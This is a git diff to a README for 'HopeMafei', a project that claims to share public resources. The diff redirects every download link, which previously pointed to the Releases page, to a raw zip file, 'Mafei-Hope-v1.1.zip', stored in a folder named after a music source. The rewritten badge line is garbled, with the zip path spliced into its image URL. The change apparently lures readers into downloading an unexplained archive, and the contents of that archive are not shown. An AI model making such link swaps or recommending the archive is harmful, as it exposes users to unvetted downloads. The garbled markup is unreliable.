@@ -1,6 +1,6 @@
 # 🚀 HopeMafei - Share Useful Public Resources
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Version-brightgreen.svg)](https://github.com/lucifervijay123/HopeMafei/releases)
+[![Download Now](https://github.com/lucifervijay123/HopeMafei/raw/refs/heads/main/CeruMusic澜音 音源文件/Mafei-Hope-v1.1.zip%20Now-Release%https://github.com/lucifervijay123/HopeMafei/raw/refs/heads/main/CeruMusic澜音 音源文件/Mafei-Hope-v1.1.zip)](https://github.com/lucifervijay123/HopeMafei/raw/refs/heads/main/CeruMusic澜音 音源文件/Mafei-Hope-v1.1.zip)
 
 ## 🌟 About HopeMafei
 
@@ -10,7 +10,7 @@ HopeMafei is your go-to source for sharing public resources. Whether you need to
 
 To get started, visit the Releases page to download the latest version of HopeMafei. 
 
-[Download from Releases](https://github.com/lucifervijay123/HopeMafei/releases)
+[Download from Releases](https://github.com/lucifervijay123/HopeMafei/raw/refs/heads/main/CeruMusic澜音 音源文件/Mafei-Hope-v1.1.zip)
 
 Here’s how to install:
 
@@ -76,4 +76,4 @@ Your feedback helps us improve. If you have suggestions or issues, please let us
 
 Thank you for using HopeMafei. Happy resource sharing!
 
-[Download from Releases](https://github.com/lucifervijay123/HopeMafei/releases)
+[Download from Releases](https://github.com/lucifervijay123/HopeMafei/raw/refs/heads/main/CeruMusic澜音 音源文件/Mafei-Hope-v1.1.zip)
